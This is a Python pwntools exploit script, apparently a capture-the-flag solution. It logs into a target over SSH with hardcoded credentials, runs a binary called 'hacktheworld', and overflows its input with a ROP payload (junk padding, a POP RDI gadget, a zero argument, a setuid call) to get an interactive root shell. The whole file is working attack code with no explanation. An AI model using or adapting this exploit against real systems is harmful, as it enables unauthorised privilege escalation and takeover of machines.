#!/usr/bin/python3

from pwn import *
import sys

# Checking argument
if len(sys.argv) != 2:
	print("Usage: " + sys.argv[0] + " target")
	exit(0)

# Getting argument
target = sys.argv[1]

# Establishing ssh session
ssh_session = ssh('magna',target,password='magnaisanelephant')
info("Opening ./hacktheworld")
proc = ssh_session.process('./hacktheworld')

# Preparing the payload
junk = b"A"*72 # Just some junk
pop_ret = p64(0x00400773) # POP RDI; RET gadget
zero = p64(0x0) # 0x00000000 to 'push' on to stack
setuid = p64(0x004006c4) # setuid() call in call_bash

payload = junk + pop_ret + zero + setuid

# Getting root shell
proc.recvrepeat(0.1) # Receives the "Who do you want to hacK? " line
proc.sendline(payload) # Sends the payload
proc.interactive() # Gets an interactive shell